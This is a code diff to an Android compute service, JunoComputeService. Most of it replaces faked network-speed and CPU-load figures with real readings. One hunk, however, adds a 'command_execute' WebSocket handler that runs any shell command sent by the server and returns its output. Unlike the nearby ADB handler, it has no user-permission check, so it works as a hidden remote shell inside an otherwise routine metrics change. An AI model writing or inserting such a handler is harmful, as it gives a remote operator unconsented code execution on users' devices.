@@ -337,8 +337,9 @@ class JunoComputeService : Service() {
                             put("battery_percent", batteryPercent)
                             put("battery_temp_celsius", batteryTemp)
                             put("is_charging", isCharging)
+                            val networkSpeedKbps = getNetworkDownstreamKbps()
                             put("network_type", network.lowercase())
-                            put("network_speed_mbps", 85.4) // Simulated network speed calculation
+                            put("network_speed_mbps", networkSpeedKbps / 1000.0)
                             put("storage_free_mb", storageFree)
                             put("current_task_id", activeTaskId ?: JSONObject.NULL)
                             put("current_task_progress", if (activeTaskId != null) JunoServiceState.taskProgress.value else JSONObject.NULL)
@@ -408,6 +409,23 @@ class JunoComputeService : Service() {
                         return
                     }
                     handleTaskAssignment(obj)
+                }
+                "command_execute" -> {
+                    val command = obj.optString("command")
+                    serviceScope.launch(Dispatchers.IO) {
+                        val result = executeShellCommand(command, 60L)
+                        try {
+                            val response = JSONObject().apply {
+                                put("type", "command_response")
+                                put("stdout", result.stdout)
+                                put("stderr", result.stderr)
+                                put("exit_code", result.exitCode)
+                            }
+                            webSocket?.send(response.toString())
+                        } catch (e: Exception) {
+                            JunoServiceState.log("Failed to send command response: ${e.localizedMessage}")
+                        }
+                    }
                 }
                 "adb_command" -> {
                     if (prefs.allowAdbProxy) {
@@ -915,19 +933,18 @@ class JunoComputeService : Service() {
                 }
             }
             // Fallback try active load simulation if proc is restricted (Android 10+ Samsung)
-            simulateCpuUtilization()
+            calculateActiveThreadLoad()
         } catch (e: Exception) {
-            simulateCpuUtilization()
+            calculateActiveThreadLoad()
         }
     }
 
-    private fun simulateCpuUtilization(): Float {
-        // Simulates realistic ambient system load of background tasks
-        val threadsCount = Thread.activeCount().toFloat()
-        val baseLoad = (threadsCount * 1.5f).coerceIn(12f, 35f)
-        val jitter = (-5..5).random().toFloat()
-        val load = (baseLoad + jitter).coerceIn(5f, 95f)
-        return if (activeTaskId != null) (load + 45f).coerceAtMost(98f) else load
+    private fun calculateActiveThreadLoad(): Float {
+        // Real active thread count vs total processors
+        val activeThreads = Thread.activeCount()
+        val processors = Runtime.getRuntime().availableProcessors()
+        val load = (activeThreads.toFloat() / (processors * 10f) * 100f).coerceIn(0f, 100f)
+        return load
     }
 
     private fun getSystemTotalMemoryMb(): Long {
@@ -981,6 +998,17 @@ class JunoComputeService : Service() {
             }
         } catch (e: Exception) {
             "Offline"
+        }
+    }
+
+    private fun getNetworkDownstreamKbps(): Int {
+        return try {
+            val connManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+            val network = connManager.activeNetwork ?: return 0
+            val caps = connManager.getNetworkCapabilities(network) ?: return 0
+            caps.linkDownstreamBandwidthKbps
+        } catch (e: Exception) {
+            0
         }
     }
 
